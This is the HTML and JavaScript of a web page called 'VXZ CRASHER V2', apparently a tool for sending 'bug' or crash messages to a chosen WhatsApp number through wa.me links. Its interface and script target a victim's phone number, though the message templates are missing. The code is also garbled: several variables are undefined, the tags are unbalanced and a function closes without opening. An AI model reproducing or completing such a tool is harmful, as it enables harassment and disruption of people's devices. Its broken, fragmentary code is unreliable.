<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>VXZ CRASHER V2</title>

  <!-- Favicon -->
  <link rel="icon" href="https://files.catbox.moe/bp63ed.png" />
  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Audiowide&display=swap" rel="stylesheet" />

  <style>
    :root{
      --bg-dark:#050405;
      --neon-1:#ff1b2f;
      --neon-2:#ff436b;
      --neon-glow:rgba(255,27,47,0.25);
      --accent-border:rgba(255,40,80,0.9);
      --panel-radius:18px;
      font-family:"Poppins",sans-serif;
    }

    html,body{
      height:100%;
      margin:0;
      background:#000;
      color:#fff;
    }

    body{
      background:url('https://files.catbox.moe/6i4f1h.jpg') center/cover no-repeat fixed;
      position:relative;
    }
    body::after{
      content:"";
      position:fixed;
      inset:0;
      background:linear-gradient(180deg,rgba(0,0,0,0.75),rgba(0,0,0,0.85));
      z-index:0;
      pointer-events:none;
    }

    .wrap{
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:flex-start;
      padding:40px 18px;
      position:relative;
      z-index:1;
    }

    .badge{
      width:10px;
      height:10px;
      border-radius:10px;
      overflow:hidden;
      border:2px solid var(--accent-border);
      box-shadow:0 0 25px var(--neon-glow);
      margin:10px auto 14px;
    }
    .badge img{width:100%;height:100%;object-fit:cover;display:block;}

    .title{
      font-family:"Audiowide",sans-serif;
      text-align:center;
      font-size:38px;
      letter-spacing:4px;
      text-transform:uppercase;
      background:linear-gradient(90deg,var(--neon-1),var(--neon-2));
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-shadow:
        0 0 10px var(--neon-1),
        0 0 20px var(--neon-1),
        0 0 40px var(--neon-1);
      margin:8px 0 18px;
    }

    .field{
      display:block;
      width:100%;
      padding:14px 16px;
      border-radius:12px;
      background:rgba(0,0,0,0.6);
      border:1px solid rgba(255,255,255,0.06);
      color:#fff;
      font-size:16px;
      box-sizing:border-box;
    }

    .btn-soft{
      display:block;
      width:100%;
      padding:14px;
      border-radius:14px;
      margin-top:14px;
      border:2px solid rgba(255,40,80,0.20);
      background:transparent;
      color:#fff;
      font-weight:600;
      text-align:center;
      transition:0.18s ease;
      cursor:pointer;
    }
    .btn-soft:hover{
      border-color:var(--neon-1);
      box-shadow:0 0 12px rgba(255,20,60,0.22);
    }

    .btn-select{
      position:relative;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:10px;
      width:100%;
      margin-top:22px;
      padding:16px 22px;
      font-family:"Audiowide",sans-serif;
      font-size:18px;
      font-weight:800;
      text-transform:uppercase;
      color:#fff;
      border:none;
      border-radius:40px;
      background:linear-gradient(135deg,#1a0000 0%,#3a0000 40%,#750000 100%);
      box-shadow:
        0 0 25px rgba(255,20,60,0.22),
        inset 0 0 15px rgba(255,0,50,0.35),
        0 0 80px rgba(255,0,60,0.12);
      cursor:pointer;
      overflow:hidden;
      transition:all 0.28s ease;
      animation:pulseGlow 3s infinite ease-in-out;
    }
    .btn-select::before{
      content:"";
      position:absolute;
      inset:0;
      border-radius:40px;
      background:linear-gradient(90deg,var(--neon-1),var(--neon-2));
      opacity:0;
      transition:opacity 0.4s ease;
      filter:blur(14px);
      z-index:0;
    }
    .btn-select:hover::before{opacity:1;}
    .btn-select span{position:relative;z-index:1;}
    .btn-select:hover{
      transform:translateY(-2px);
      box-shadow:
        0 0 35px rgba(255,30,60,0.38),
        inset 0 0 25px rgba(255,0,60,0.45),
        0 0 90px rgba(255,0,80,0.18);
    }

    @keyframes pulseGlow{
      0%,100%{box-shadow:0 0 22px rgba(255,30,60,0.28), inset 0 0 12px rgba(255,0,40,0.35);}
      50%{box-shadow:0 0 34px rgba(255,30,60,0.48), inset 0 0 26px rgba(255,0,60,0.55);}
    }

    .note{
      font-size:13px;
      color:rgba(255,200,200,0.7);
      text-align:center;
      margin-top:12px;
    }

    @media (max-width:420px){
      .title{font-size:32px;letter-spacing:3px;}
      .badge{width:200px;height:200px;}
    }
  </style>
</head>
<body>

      <img src="https://files.catbox.moe/tdfoab.jpg" alt="Heading Image" class="header-img"/>

      </div>

      </div>

      <button id="send" class="btn">SEND BUG</button>

      <div class="small">Subscribe biar buat apk lebih gacor.</div>
    </div>
  </div>

  <script>

      function sanitizeNumber(s){
        if(!s) return "";
        return s.replace(/[^0-9]/g,'');
      }

      function getMessage(){
        const sel = method.value;
        return templates[sel] || "";
      }

      sendBtn.addEventListener('click', ()=>{
        const num = sanitizeNumber(targetInput.value.trim());
        if(!num){
          alert('Masukkan nomor target yang valid (contoh: 6281234567890).');
          targetInput.focus();
          return;
        }

        const msg = encodeURIComponent(getMessage());
        if(!msg){
          alert('Pilih tipe bug terlebih dahulu.');
          return;
        }

        window.open(`https://wa.me/${num}?text=${msg}`, '_blank');
      });

    })();
